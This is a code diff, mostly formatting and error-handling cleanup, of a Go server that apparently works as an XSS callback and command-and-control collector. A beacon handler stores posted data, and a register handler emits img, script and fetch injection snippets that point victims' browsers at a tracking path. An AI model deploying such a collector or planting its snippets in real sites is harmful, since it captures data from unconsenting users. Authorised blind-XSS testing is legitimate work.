@@ -36,18 +36,15 @@ var (
 )
 
 func main() {
-	// allow overriding file via env for tests
-	if v := os.Getenv("XSS_C2_DATAFILE"); v != "" {
-		dataFile = v
-	}
-
 	if err := loadSubmissions(); err != nil {
 		log.Printf("warning: could not load submissions: %v", err)
 	}
 
 	// create data directory if path contains dirs
 	if dir := filepath.Dir(dataFile); dir != "." {
-		os.MkdirAll(dir, 0700)
+		if err := os.MkdirAll(dir, 0o700); err != nil {
+			log.Printf("warning: could not create data directory %q: %v", dir, err)
+		}
 	}
 
 	// register handlers on the default mux
@@ -189,7 +186,7 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	var payload struct{
+	var payload struct {
 		Data string `json:"data"`
 	}
 	dec := json.NewDecoder(r.Body)
@@ -225,7 +222,7 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]any{"status":"ok","id":s.ID})
+	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "id": s.ID})
 }
 
 // submissionsAPIHandler returns the submissions as JSON (read-only GET).
@@ -260,11 +257,14 @@ func registerHandler(w http.ResponseWriter, r *http.Request) {
 	token := hex.EncodeToString(b)
 	trackPath := "/track/" + token
 
-	snippet := fmt.Sprintf(`<img src="%s"/>\n<!-- or -->\n<script src="%s"></script>\n<!-- or fetch: fetch('%s', {mode:'no-cors'}) -->`, trackPath, trackPath, trackPath)
+	snippet := fmt.Sprintf(`<img src="%s"/>
+<!-- or -->
+<script src="%s"></script>
+<!-- or fetch: fetch('%s', {mode:'no-cors'}) -->`, trackPath, trackPath, trackPath)
 
 	resp := map[string]any{
-		"token": token,
-		"url":   trackPath,
+		"token":   token,
+		"url":     trackPath,
 		"snippet": snippet,
 	}
 
